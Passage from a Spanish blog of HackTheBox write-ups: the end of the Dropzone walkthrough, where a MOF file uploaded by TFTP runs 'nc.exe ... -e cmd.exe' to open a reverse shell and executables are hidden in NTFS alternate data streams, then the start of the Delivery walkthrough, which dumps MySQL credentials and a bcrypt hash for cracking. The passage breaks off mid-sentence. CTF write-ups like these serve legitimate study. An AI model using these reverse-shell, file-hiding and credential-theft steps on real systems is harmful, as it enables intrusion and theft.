MyClasseAcabo\\  ;59:instance of MyClasseAcabo as $MyClass‚ù± sed -i 's/@CLASS@/eAcabo/g' payload. mofListos, no vemos m√°s referencias extra√±as‚Ä¶ Lo que har√° el objeto al ser compilado ser√°:  Ejecutar√° nuestro payload (nc. exe) para que haga una petici√≥n hacia nuestro listener.  Borrar√° los dos archivos, tanto el objeto . mof como el binario nc. exe del sistema. Procedamos a subir los archivos y ver si obtenemos alguna petici√≥n: ‚ù± nc -lvp 4433listening on [any] 4433 . . . Y en el servidor TFTP subimos los objetos: (Recordemos las rutas donde debemos subirlos: exe, c:\Windows\System32 y mof, c:\Windows\System32\wbem\mof). ‚ù± rlwrap tftp dropzone. htb 69tftp&gt; binarytftp&gt; put nc. exe /Windows/System32/nc. exeSent 38866 bytes in 8. 3 secondstftp&gt; put payload. mof /Windows/System32/wbem/mof/payload. mofSent 2349 bytes in 0. 7 secondstftp&gt; Pero no recibimos nada üòù Comparando nuestro . mof con los ejemplos que vimos antes, encontramos una diferencia relacionada con los escapes de caracteres. Ejemplo de la web: #pragma namespace ( \\\\. \\root\\subscription )El nuestro: #pragma namespace( \\\\\\\\. \\\\root\\\\cimv2 )Vale, pues en todo el archivo hay varios ‚Äúescapes‚Äù de ese estilo, as√≠ que juguemos de nuevo con sed para indicarle que si encuentra 4 \ los remplace por 2 \: ‚ù± head payload. mof -n 1#pragma namespace( \\\\\\\\. \\\\root\\\\cimv2 )‚ù± sed 's/\\\\/\\/g' payload. mof | head -n 1#pragma namespace( \\\\. \\root\\cimv2 )Listo, hag√°moslo permanente: ‚ù± sed -i 's/\\\\/\\/g' payload. mofAhora, volvamos a intentar a ver si ese era el problema: tftp&gt; binarytftp&gt; put nc. exe /Windows/System32/nc. exeSent 38616 bytes in 8. 3 secondstftp&gt; put payload. mof /Windows/System32/wbem/mof/payload. mofSent 2218 bytes in 0. 7 secondstftp&gt; Y en nuestro listener: ‚ù± nc -lvp 4433listening on [any] 4433 . . . connect to [10. 10. 14. 10] from dropzone. htb [10. 10. 10. 90] 1066TENEMOS RESPUESTAAAAAAAAAAAAAAAAAAaaaAAaasdfasdflkjasdgkl√±!! Listoooooooooooo, podr√≠amos generar un payload con msfvenom que al ejecutarse nos lanzara una Reverse Shell, pero probando con el mismo nc. exe podemos indicarle la instrucci√≥n de siempre: . . . ScriptText = . . . ns. Run(\ nc. exe 10. 10. 14. 10 4433 -e cmd. exe\ );} catch. . . . . . Con eso le indicamos que una vez se obtenga la petici√≥n en nuestro servidor (listener) nos lance una cmd. exe, o sea, una terminal (: Subimos los binarios y en nuestro listeneeeeeer: Perfectisimoooooooooooooooooooooooo, no tenemos habilitado el comando whoami ni echo %username para ver con que usuario estamos, pero, si logramos escribir en esas rutas tenemos constancia que somos administradores del sistema :P Veamos las flags: C:\&gt;dir Volume in drive C has no label. Volume Serial Number is 7CF6-55F6 Directory of C:\09/05/2018 10:39   &lt;DIR&gt;     114de795ed2964dbe35a09/05/2018 05:22         0 AUTOEXEC. BAT09/05/2018 05:22         0 CONFIG. SYS09/05/2018 08:50   &lt;DIR&gt;     Documents and Settings09/05/2018 10:41   &lt;DIR&gt;     Program Files10/05/2018 02:49   &lt;DIR&gt;     WINDOWS        2 File(s)       0 bytes        4 Dir(s)  7. 634. 173. 952 bytes freeC:\&gt;C:\&gt;cd  Documents and Settings C:\Documents and Settings&gt;dir Volume in drive C has no label. Volume Serial Number is 7CF6-55F6 Directory of C:\Documents and Settings09/05/2018 08:50   &lt;DIR&gt;     . 09/05/2018 08:50   &lt;DIR&gt;     . . 09/05/2018 10:20   &lt;DIR&gt;     Administrator09/05/2018 05:21   &lt;DIR&gt;     All Users        0 File(s)       0 bytes        4 Dir(s)  7. 634. 165. 760 bytes freeC:\Documents and Settings&gt;Solo hay un usuario, en su directorio Desktop vemos: C:\Documents and Settings\Administrator\Desktop&gt;dir Volume in drive C has no label. Volume Serial Number is 7CF6-55F6 Directory of C:\Documents and Settings\Administrator\Desktop02/03/2021 07:59   &lt;DIR&gt;     . 02/03/2021 07:59   &lt;DIR&gt;     . . 10/05/2018 10:10   &lt;DIR&gt;     flags10/05/2018 10:12         31 root. txt        1 File(s)       31 bytes        3 Dir(s)  7. 634. 161. 664 bytes freeC:\Documents and Settings\Administrator\Desktop&gt;Si visualizamos la flag, tenemos: C:\Documents and Settings\Administrator\Desktop&gt;type root. txtIt's easy, but not THAT easy. . . C:\Documents and Settings\Administrator\Desktop&gt;Jmmm‚Ä¶ Dentro de la carpeta llamada flags tenemos: C:\Documents and Settings\Administrator\Desktop\flags&gt;dir Volume in drive C has no label. Volume Serial Number is 7CF6-55F6 Directory of C:\Documents and Settings\Administrator\Desktop\flags10/05/2018 10:10   &lt;DIR&gt;     . 10/05/2018 10:10   &lt;DIR&gt;     . . 10/05/2018 10:09         76 2 for the price of 1!. txt        1 File(s)       76 bytes        2 Dir(s)  7. 634. 149. 376 bytes freeC:\Documents and Settings\Administrator\Desktop\flags&gt;Y en el archivo: C:\Documents and Settings\Administrator\Desktop\flags&gt;type  2 for the price of 1!. txt For limited time only!Keep an eye on our ADS for new offers &amp; discounts!C:\Documents and Settings\Administrator\Desktop\flags&gt;:o ‚Ä¶ Movimiento lateral : ADS -&gt; flags #: Buscando por ads (alguna carpeta con referencia a promociones o alg√∫n programa que se relacionara) en el sistema, no encontr√© nada :) Con una simple petici√≥n en la web con: ‚Äúads windows‚Äù, encontramos algo llamado Flujos de datos alternativos (en ingles Alternate Data Stream - ADS), veamos si lo podemos relacionar con la m√°quina. ADS - ¬økhe ez eztho?: Es una caracter√≠stica de los ficheros NTFS (New Techonology File System: sistema de archivos que permite organizar datos en discos duros y otros medios de almacenamiento) que habilita el guardar archivos ‚Äúocultos‚Äù dentro de otros archivos o carpetas en el sistema. ADS en Windows.  Y si, interesante, pueda que debamos buscar alg√∫n ADS en los propios archivos que hacen referencia a las flags, (tiene toda la pinta de ser por ah√≠).  Lindo post en espa√±ol para entender los flujos de datos alternativos (ADS). Primero veamos como funciona para despues encontrar formas de ver ADS‚Äôs en archivos‚Ä¶  Alternate Data Streams are simple to create and entail little or no skill to use. Common DOS commands such as type can be used to create Alternate Data Streams (ADS). These commands are used in conjunction with a redirect [&gt;] and colon [:] to fork one file into another. Alternate Data Stream. El anterior recurso nos da un ejemplo sencillo: type c:\malicious. exe &gt; c:\winnt\system32\calc. exe:malicious. exeAhondemos en algo muuucho m√°s sencillo, as√≠ nos queda claro el funcionamiento, poder leer el ejemplo anterior y entenderlo mejor‚Ä¶ Creamos ADS en archivo randomCreamos objeto: C:\totest&gt;echo  hola como estoy  &gt; hola. txtC:\totest&gt;type hola. txt hola como estoy Bien, todo normal, ahoraaaaaa Agregamos ADS en archivo hola. txtGuardemos otra cadena en el archivo hola. txt, con la ayuda de la herramienta type en Windows lograremos agregar el ADS al objeto: C:\totest&gt;echo  pero claro que si  &gt; claro. txtC:\totest&gt;dir Volume in drive C has no label. Volume Serial Number is 7CF6-55F6 Directory of C:\totest31/05/2021 11:15   &lt;DIR&gt;     . 31/05/2021 11:15   &lt;DIR&gt;     . . 31/05/2021 11:15         22 claro. txt31/05/2021 11:15         20 hola. txt        2 File(s)       42 bytes        2 Dir(s)  7. 633. 752. 064 bytes freeC:\totest&gt;type claro. txt &gt; hola. txt:claro. txtAhora vemos su contenido Validando la inserci√≥n del contenido oculto dentro del archivo hola. txtJugamos con more: C:\totest&gt;more &lt; hola. txt hola como estoy  C:\totest&gt;C:\totest&gt;more &lt; hola. txt:claro. txt pero claro que si C:\totest&gt;Perfecto, ya tenemos oculto dentro del archivo hola. txt el contenido del objeto claro. txt (: Para el caso de querer ocultar un objeto ejecutable (por ejemplo calc. exe) en otro archivo, hacemos los mismos pasos solo que si queremos ejecutar el ADS (. exe incrustado) lo llamamos as√≠: C:\totest&gt;type c:\windows\system32\calc. exe &gt; hola. txt:calc. exeC:\totest&gt;start c:\totest\hola. txt:calc. exeY ejecutar√≠a la calculadora :P  Tomado de: ADS - The good and the bad. ‚Ä¶ Otro ejemplo sin necesidad de crear un archivo: C:\totest&gt;echo  nop, asi no  &gt; claro. txt:nop. txtC:\totest&gt;more &lt; claro. txt pero claro que si C:\totest&gt;more &lt; claro. txt:nop. txt nop, asi no  Y bueno hay muchos ejemplos, se vuelve superinteresante cuando piensas todo lo que puedes llegar a hacer con esto‚Ä¶ ‚Ä¶ Validamos existencia de ADS en archivosPero listo, ahora la duda: ¬øC√≥mo s√© si alg√∫n archivo tiene un ADS dentro? Pues bien, en esta introducci√≥n a los ADS responden esta pregunta con un software llamado streams. exe. Dando algunas vueltas para encontrar el binario, no solo encontramos ese, si no varios m√°s.  Respuesta en foro sobre maneras de identificar archivos ocultos con ADS. Y ac√° tenemos un comprimido con muuuuchos binarios que nos ayudaran con esa tarea (el que usaremos ser√° streams. exe):  Si das clic te descargar√° el comprimido de una vez. Descomprimimos, tomamos el binario y simplemente lo subimos al sistema: tftp&gt; put streams. exe /totest/streams. exeSent 342392 bytes in 73. 4 secondstftp&gt; Validamos: C:\totest&gt;dir Volume in drive C has no label. Volume Serial Number is 7CF6-55F6 Directory of C:\totest31/05/2021 11:40   &lt;DIR&gt;     . 31/05/2021 11:40   &lt;DIR&gt;     . . 31/05/2021 11:22         22 claro. txt31/05/2021 11:15         20 hola. txt31/05/2021 11:41      342. 392 streams. exe        3 File(s)    342. 434 bytes        2 Dir(s)  7. 633. 166. 336 bytes freeC:\totest&gt;asdfPerfectisimo, la ejecuci√≥n es supersencilla, solo le debemos pasar el archivo o directorio (para esto le indicas el par√°metro -s, as√≠ sabe que debe hacerlo recursivamente) donde buscar: Primero aceptamos unos t√©rminos usando -accepteula: C:\totest&gt;streams. exe -accepteulastreams v1. 60 - Reveal NTFS alternate streams. Copyright (C) 2005-2016 Mark RussinovichSysinternals - www. sysinternals. comusage: streams. exe [-s] [-d] &lt;file or directory&gt;-s   Recurse subdirectories-d   Delete streams-nobanner    Do not display the startup banner and copyright message. C:\totest&gt;Y ahora si a jugar: C:\totest&gt;streams. exe -s c:\toteststreams v1. 60 - Reveal NTFS alternate streams. Copyright (C) 2005-2016 Mark RussinovichSysinternals - www. sysinternals. comc:\totest\claro. txt:     :nop. txt:$DATA 16c:\totest\hola. txt:    :claro. txt:$DATA 22   :claroquesi:$DATA 0C:\totest&gt;En nuestro directorio vemos todos los objetos ocultos que hab√≠amos creado antes (: Pues hagamos lo mismo pero con los archivos de flags a ver que: C:\totest&gt;streams. exe  c:\Documents and Settings\Administrator\Desktop\root. txt streams v1. 60 - Reveal NTFS alternate streams. Copyright (C) 2005-2016 Mark RussinovichSysinternals - www. sysinternals. comC:\totest&gt;Contra root. txt no detecta ning√∫n ADS, veamos con el archivo que est√° dentro de la carpeta flags: C:\totest&gt;streams. exe  c:\Documents and Settings\Administrator\Desktop\flags\2 for the price of 1!. txt  OPAAAAAAAAAAAAAAAaa, tamoooooooooooooooo melos ;) Encontramos las flags ocultas en el archivo, as√≠ que, hemos terminao por ahora. ‚Ä¶ Brutal m√°quina, la explotaci√≥n inicial es una locura, me encanta como de una subida de archivos por FTP se puede volcar en un RCE, interesant√≠simo proceso. Y el como llegamos a las flags me encanto, primero porque no lo hab√≠a usado y segundo porque es un tema superdiab√≥lico eh jajaj, bastante llamativo para jugar con √©l. Weno, espero haberme hecho entender y sobre todo espero que hayan aprendido algo nuevo, como siempre, a seguir rompiendo todo!! ü•∞ "
    }, {
    "id": 48,
    "url": "http://localhost:4000/htb/delivery",
    "title": "HackTheBox - Delivery",
    "body": "2021/05/22 - M√°quina Linux nivel f√°cil, jugaremos con osTicket creando tickets que nos servir√°n para ¬øobtener emails externos en el propio status del ticket? ¬økhE? (jajaj, sip), nos moveremos entre archivos y bases de datos MySQL y curiosamente usaremos las reglas para romper cosas con HashCat y John The Ripper :) TL;DR (Spanish writeup): Creada por: ippsec. El master craster faster :D Bueno bueno bueeeeno, encontraremos dos servicios, uno que nos permite generar tickets que ser√°n enviados a una mesa de ayuda (software osTicket) y otro que nos permitir√° comunicarnos con nuestros equipos de trabajo (software Mattermost)‚Ä¶ Jugando con los dos, encontraremos que cuando generamos un ticket, crea un email asociado a ese ticket. Peeero que si validamos el status de ese ticket e interactuamos con ese email externamente, podremos llegar a obtener correos enviados a ese email en el status del ticket üôÉ Una vaina loca! Apoyados en esto lograremos validar una cuenta creada en el servicio Mattermost, en el dashboard encontraremos un chat correspondiente a un equipo de trabajo, en esos mensajes tendremos unas credenciales, una referencia a reutilizaci√≥n de contrase√±as y a reglas de hashcat. Las credenciales nos servir√°n para entrar al panel de control donde est√°n todos los tickets y tambi√©n nos permitir√°n obtener una sesi√≥n por medio de SSH como el usuario maildeliverer en la m√°quina. Enumerando los directorios de los servicios web, encontramos en la ra√≠z de Mattermost unas credenciales del usuario que mantiene la base de datos MySQL, recorreremos la base de datos mattermost para encontrar una contrase√±a encriptada en formato bcrypt asociada a un usuario llamado root del servicio web. Jugando con las reglas tanto de hashcat como de john lograremos crackear el hash del usuario root. Probando esa contrase√±a en el sistema contra el usuario root obtendremos una sesi√≥n como √©l. Clasificaci√≥n de la m√°quina:  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ Tonces!  Enumeraci√≥n.  Explotaci√≥n.  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: Hacemos un escaneo inicial para obtener los puertos abiertos y que servicios aparentemente est√°s corriendo sobre ellos: „Çùnmap -p- --open -v 10. 10. 10. 222 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   „Çù cat initScan# Nmap 7. 80 scan initiated Tue Jan 12 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 222# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 222 () Status: UpHost: 10. 10. 10. 222 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 8065/open/tcp/////# Nmap done at Tue Jan 12 25:25:25 2021 -- 1 IP address (1 host up) scanned in 126. 12 secondsEncontramos:       Puerto   Descripci√≥n         22   SSH       80   HTTP       8065   No sabemos a√∫n   Ahora validemos si existen versiones y scripts relacionados para esos servicios corriendo: „Çù nmap -p 22,80,8065 -sC -sV 10. 10. 10. 222 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚ù≠ cat portScan # Nmap 7. 80 scan initiated Tue Jan 12 25:25:25 2021 as: nmap -p 22,80,8065 -sC -sV -oN portScan 10. 10. 10. 222Nmap scan report for 10. 10. 10. 222Host is up (0. 19s latency). PORT   STATE SERVICE VERSION22/tcp  open ssh   OpenSSH 7. 9p1 Debian 10+deb10u2 (protocol 2. 0)| ssh-hostkey: |  2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)|  256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)|_ 256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)80/tcp  open http  nginx 1. 14. 2|_http-server-header: nginx/1. 14. 2|_http-title: Welcome8065/tcp open unknown| fingerprint-strings: |  GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: |   HTTP/1. 1 400 Bad Request|   Content-Type: text/plain; charset=utf-8|   Connection: close|   Request|  GetRequest: |   HTTP/1. 0 200 OK|   Accept-Ranges: bytes|   Cache-Control: no-cache, max-age=31556926, public|   Content-Length: 3108|   Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn. rudderlabs. com|   Content-Type: text/html; charset=utf-8|   Last-Modified: Tue, 12 Jan 2021 14:01:26 GMT|   X-Frame-Options: SAMEORIGIN|   X-Request-Id: sjgqngc48j8m3j91o7tu3pyigy|   X-Version-Id: 5. 30. 0. 5. 30. 1. 57fb31b889bf81d99d8af8176d4bbaaa. false|   Date: Tue, 12 Jan 2021 15:16:24 GMT|   &lt;!doctype html&gt;&lt;html lang= en &gt;&lt;head&gt;&lt;meta charset= utf-8 &gt;&lt;meta name= viewport  content= width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0 &gt;&lt;meta name= robots  content= noindex, nofollow &gt;&lt;meta name= referrer  content= no-referrer &gt;&lt;title&gt;Mattermost&lt;/title&gt;&lt;meta name= mobile-web-app-capable  content= yes &gt;&lt;meta name= application-name  content= Mattermost &gt;&lt;meta name= format-detection  content= telephone=no &gt;&lt;link re|  HTTPOptions: |   HTTP/1. 0 405 Method Not Allowed|   Date: Tue, 12 Jan 2021 15:16:24 GMT|_  Content-Length: 01 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap. org/cgi-bin/submit. cgi?new-service :SF-Port8065-TCP:V=7. 80%I=7%D=1/12%Time=5FFDBB34%P=x86_64-pc-linux-gnu%r(GeSF:nericLines,67, HTTP/1\. 1. . .  . . . . . . # Esto no es necesario, adem√°s lo quito por unos problemas que me da con la busqueda. . . . . . Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Tue Jan 12 25:25:25 2021 -- 1 IP address (1 host up) scanned in 113. 07 secondsY ahora obtenemos las versiones:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 7. 9p1       80   HTTP   nginx 1. 14. 2       8065   HTTP   unknown - Pero parece un servidor web   Bueno, profundicemos en cada uno de ellos (: ‚Ä¶ Puerto 80 - osTicket ‚åñ: Un simple servicio web, si posicionamos el cursor sobre HELPDESK, vemos que nos redirige a un dominio: helpdesk. delivery. htb, agregu√©moslo al archivo /etc/hosts para que cuando hagamos una petici√≥n hacia ese dominio nos resuelva hacia la IP 10. 10. 10. 200, as√≠ logra el servicio web entender hacia donde debe ir a buscar la info del dominio: (Aprovechemos para agregar el dominio **delivery. htb, por si algo)** „Çù cat /etc/hosts. . . 10. 10. 10. 222 helpdesk. delivery. htb delivery. htb. . . Si nos dirigimos hacia el dominio, vemos: Valeee, estamos ante un servicio llamado osTicket, que se encarga de brindar soporte al cliente, facilitando el orden y administraci√≥n de los tickets enviados a mesa de ayuda, entre otras cosas‚Ä¶ Tenemos varios apartados, a la vista tres: abrir un nuevo ticket, verificar el status de un ticket y logearnos en osTicket. Si nos dirigimos a abrir un ticket nos pide una direcci√≥n email, as√≠ que veamos si podemos crearnos una: Vemos aparentemente dos nuevos apartados, uno en donde podemos registrar una cuenta y otra que nos dirige a un nuevo login, en este caso (seg√∫n lo que vimos) para los ‚Äúagentes‚Äù, echemos un ojo r√°pidamente: Probando credenciales por default no logramos nada, as√≠ que volvamos y registremos una cuenta. Registramos y nos redirige a una ventana que nos indica que nos enviara un email de verificaci√≥n para hacer efectivo el registro :( (Ac√° pens√© en tomar un email temporal online y volver a registrarnos, pero no llega ning√∫n correo, as√≠ que esto no debe ser relevante. Si intentamos logearnos con las credenciales registradas obtenemos: Account confirmation requiredAs√≠ que F, reconfirmamos que probablemente no sea necesario crear una cuenta para explotar la m√°quina ;) Ahora s√≠, creemos un ticket con el email que registramos a ver si vemos algo, llenamos los campos necesarios, damos clic en Create Ticket y nos responde con: Varias cositas interesantes:  Crea un ticket con lo que parece ser un n√∫mero aleatorio, pero ese mismo n√∫mero lo usa para generar un email con dominio delivery. htb‚Ä¶Si intentamos ver el status del ticket nos vuelve a responder con Account confirmation required :( Jmmm, despues de muchas pruebas (listo 2, pero uff, lo que prob√© jaja), como estas:  Crearnos un correo que tenga el dominio delivery. htb, crear ticket y validar su estado.  Usar el correo que nos da al crear el ticket y registar una cuenta con √©l. No logramos ver ning√∫n ticket. Se me dio por probar a crear un ticket como el usuario admin@delivery. htb (que no sab√≠a que exist√≠a, pero son pruebas que se deben hacer) y con el s√≠ podemos ver el status del ticket. Como ejemplo creamos uno y nos devuelve:  ID: 9827830.  email: 9827830@delivery. htb. Llegamos a: Bien, tenemos un usuario v√°lido para ver tickets‚Ä¶ No podemos hacer mucho con el contenido del ticket, as√≠ que tamos perdidos de nuevo :) Probando cosas (de nuevo) no conseguimos nada, as√≠ que mov√°monos de servicio mientras tanto, quiz√°s encontramos algo √∫til para volver. ‚Ä¶ Puerto 8065 - Mattermost ‚åñ: Nos redirige al apartado /login y efectivamente tenemos un login üòú del servicio Mattermost, que nos ayuda a comunicarnos con un (o muchos) equipo(s) de trabajo. En la imagen vemos la opci√≥n de crear una cuenta, la creamos y nos muestra como respuesta: De nuevo tenemos que validar el email :( ‚Ä¶ Explotaci√≥n #: Estuve tambi√©n probando varias cosas, pero en un momento intente algo curioso y loco (muy loco):  Crear una cuenta asociada a este email: 9827830@delivery. htb, que fue el que obtuvimos al crear el ticket. Hasta ac√° todo normal y nada loco‚Ä¶ Pero actualice la p√°gina donde ten√≠amos el status del ticket 9827830 y la info cambio, ahora tenemos esto:  Exacto, as√≠ quede. WtfFFFFFFFFFfdfffFffffffffffffff. Tenemos el link para activar nuestra cuenta recientemente creada en el servicio Mattermost‚Ä¶ Entendamos el porqu√©: 1. Creamos un ticket en el servicio osTicket y ese ticket genera un email, en la respuesta al generar el ticket vemos:  If you want to add more information to your ticket, just email 9827830@delivery. htb. No lo vimos relevante pero ahora toma sentido. 2. Creamos una cuenta con el email anterior en el servicio Mattermost y como respuesta el servicio env√≠a un correo para validar la cuenta. 3. Como vimos en el punto 1, pr√°cticamente estamos ‚Äúa√±adiendo‚Äù m√°s informaci√≥n al ticket, donde esa ‚Äúm√°s informaci√≥n‚Äù es el correo enviado por Mattermost, por lo que entendemos que toda info enviada a ese correo actualizara el estado del ticket :) Bingo! Perfecto, ya entendemos que est√° pasando, y que locura eh! Podemos seguir (: En el correo enviado por Mattermost nos referencian el link para activar la cuenta: Please activate your email by going to: http://delivery. htb:8065/do_verify_email?token=6qm5nbugy3fgtwhm3zoxwt4zybrc8ip9xxffpfamfcyku8uhqepccj3rnopkrbsu&amp;email=9827830%40delivery. htbSi vamos hacia √©l, obtenemos: Listones, tamos verificaos‚Äô, colocamos la contrase√±a, enviamos la petici√≥n yyyy: Nos pide seleccionar un equipo, dejamos el que esta por default llamado internal, damos clic sobre √©l, despues nos hace un tutorial y finalmente llegamos a toda la info sobre el equipo internal: Vale, varias cositas interesantes:  Nos da unas credenciales de ‚Äúun servidor‚Äù, tenemos 3 logins para probar y un SSH, as√≠ que tamos bien‚Ä¶ Dice que est√°n usando la misma contrase√±a en todos los sitios :o Y que las contrase√±as est√°n relacionadas con PleaseSubscribe!.  Y vemos una referencia a reglas de hashcat, que relacionando el anterior punto, tiene mucho sentido :)Bien, pues primero validemos las credenciales que nos dieron a ver donde funcionan. Prob√°ndolas en el login de los agentes vemos que son v√°lidas:  Encontramos tooooooooooooooooodos los tickets creados y su hist√≥rico, entre muchas cosas m√°s, como el Admin Panel en la parte superior (: Prob√°ndolas contra el servicio SSH obtenemos una sesi√≥n: „Çù ssh maildeliverer@10. 10. 10. 222maildeliverer@10. 10. 10. 222's password: Linux Delivery 4. 19. 0-13-amd64 #1 SMP Debian 4. 19. 160-2 (2020-11-28) x86_64. . . maildeliverer@Delivery:~$ iduid=1000(maildeliverer) gid=1000(maildeliverer) groups=1000(maildeliverer)maildeliverer@Delivery:~$ ‚Ä¶ Escalada de privilegios #: Despues de enumerar algunos archivos, encontramos los objetos fuente del servicio Mattermost y una carpeta de configuraci√≥n: maildeliverer@Delivery:/opt/mattermost/config$ ls -latotal 36drwxrwxr-x 2 mattermost mattermost 4096 Dec 26 09:23 . drwxrwxr-x 12 mattermost mattermost 4096 Dec 26 09:24 . . -rw-rw-r-- 1 mattermost mattermost  922 Dec 18 08:52 cloud_defaults. json-rw-rw-r-- 1 mattermost mattermost 18774 May 15 19:24 config. json-rw-rw-r-- 1 mattermost mattermost  243 Dec 18 08:52 README. mdEchando un ojito al archivo config. json, vemos algo interesante: {. . .   . . .    SqlSettings : {     DriverName :  mysql ,     DataSource :  mmuser:Crack_The_MM_Admin_PW@tcp(127. 0. 0. 1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s ,     DataSourceReplicas : [],     DataSourceSearchReplicas : [],     MaxIdleConns : 20,     ConnMaxLifetimeMilliseconds : 3600000,     MaxOpenConns : 300,     Trace : false,     AtRestEncryptKey :  n5uax3d4f919obtsp1pw1k5xetq1enez ,     QueryTimeout : 30,     DisableDatabaseSearch : false  },  . . . . . . Ehh opa, conseguimos lo que parecen ser unas credenciales del servicio MySQL (gestor bases de datos):  mmuser:Crack_The_MM_Admin_PW, una pw bastante extra√±a.  Al parecer es un atributo propio de Mattermost y no algo hecho a posta por ippsec: mattermost - config-in-database. Probemos a ver si son v√°lidas: maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -pEnter password: Welcome to the MariaDB monitor.  Commands end with ; or \g. Your MariaDB connection id is 556Server version: 10. 3. 27-MariaDB-0+deb10u1 Debian 10Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type 'help;' or '\h' for help. Type '\c' to clear the current input statement. MariaDB [(none)]&gt;maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -pCrack_The_MM_Admin_PWWelcome to the MariaDB monitor.  Commands end with ; or \g. Your MariaDB connection id is 557Server version: 10. 3. 27-MariaDB-0+deb10u1 Debian 10Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type 'help;' or '\h' for help. Type '\c' to clear the current input statement. MariaDB [(none)]&gt;(Solo quer√≠a mostrarles dos maneras de hacerlo :P) Son v√°lidas e. e Pues enumeremos las bases de datos y su informaci√≥n‚Ä¶ ‚Ä¶ Buscando en MySQL: Tenemos: MariaDB [(none)]&gt; show databases;+--------------------+| Database      |+--------------------+| information_schema || mattermost     |+--------------------+2 rows in set (0. 000 sec)MariaDB [(none)]&gt;MariaDB [(none)]&gt; use mattermost;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [mattermost]&gt; MariaDB [mattermost]&gt; show tables;+------------------------+| Tables_in_mattermost  |+------------------------+| Audits         |. . . | UserAccessTokens    || UserGroups       || UserTermsOfService   || Users         |+------------------------+46 rows in set (0. 001 sec)MariaDB [mattermost]&gt; Varias tablas, pero veamos Users inicialmente: MariaDB [mattermost]&gt; SELECT * FROM Users;. . . Jmmm, un mont√≥n de usuarios y al haber tantos campos, pues se ve horrible todo :o Pero m√°s o menos el formato de la tabla es as√≠: | Id             | CreateAt   | UpdateAt   | DeleteAt | Username             | Password                           | AuthData | AuthService | Email          | EmailVerified | Nickname | FirstName     | LastName | Position | Roles          | AllowMarketing | Props | NotifyProps                                                                                 | LastPasswordUpdate | LastPictureUpdate | FailedAttempts | Locale | Timezone                                         | MfaActive | MfaSecret |  | 16w657nsqpga5ci965u5gjks9w | 1621140348792 | 1621140348792 |    0 | hola               | $2a$10$HMg19A65aU4TPSj2K3pbCuOYrc0zNh45URBKuNAX1f6AzXTnulB9m | NULL   |       | hola@lanz. com      |       0 |     |          |     |     | system_user       |       1 | {}  | { channel : true , comments : never , desktop : mention , desktop_sound : true , email : true , first_name : false , mention_keys :  , push : mention , push_status : away } |   1621140348792 |         0 |       0 | en   | { automaticTimezone :  , manualTimezone :  , useAutomaticTimezone : true }        |     0 |      |. . . Donde en la contrase√±a vemos un hash tipo bcrypt seg√∫n la wiki de ejemplos de hashcat.  Claramente no voy a jugar con un usuario que yo cree :P, pero si con uno interesante que vi: . . . | dijg7mcf4tf3xrgxi5ntqdefma | 1608992692294 | 1609157893370 |    0 | root               | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O. 1STWb4. 4ScG. anuu7v0EFJwgjjO | NULL   |       | root@delivery. htb    |       1 |     |          |     |     | system_admin system_user |       1 | {}  | { channel : true , comments : never , desktop : mention , desktop_sound : true , email : true , first_name : false , mention_keys :  , push : mention , push_status : away } |   1609157893370 |         0 |       0 | en   | { automaticTimezone : Africa/Abidjan , manualTimezone :  , useAutomaticTimezone : true } |     0 |      |. . . Dos cositas interesantes de este usuario:  Pos que se llama root e. e Pero m√°s importante, en la columna Roles, tiene asignados: system_admin y system_user. ¬øCu√°l es el importante y porque es relevante este usuario?Listones, tomemos ese hash y guard√©moslo en un archivo: „Çù cat hash_root_mattermost$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O. 1STWb4. 4ScG. anuu7v0EFJwgjjOY procedamos a crackearlo, podr√≠amos usar el famoso diccionario rockyou. txt, pero recordemos lo que nos encontramos en los mensajes del equipo:  PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases. Todas las contrase√±as est√°n asociadas o tienen que ver con PleaseSubscribe! y que esa palabra no est√° en el diccionario rockyou. txt‚Ä¶ Entonces, sabemos que debe estar asociada a PleaseSubscribe! (este ser√≠a nuestro diccionario), podemos hacer uso de reglas (como bien nos lo indica el mensaje citado) para indicar que tome nuestro diccionario y empiece (depende de la regla) a modificar cada palabra del diccionario agreg√°ndole, borr√°ndole, cambiando a may√∫sculas, min√∫sculas, moviendo letras, agregando n√∫meros, s√≠mbolos, etc. Todo lo que podamos imaginarnos con respecto a manipular una palabra lo hacen las reglas. Entonces por cada modificaci√≥n va validando si ese resultado hace match con el 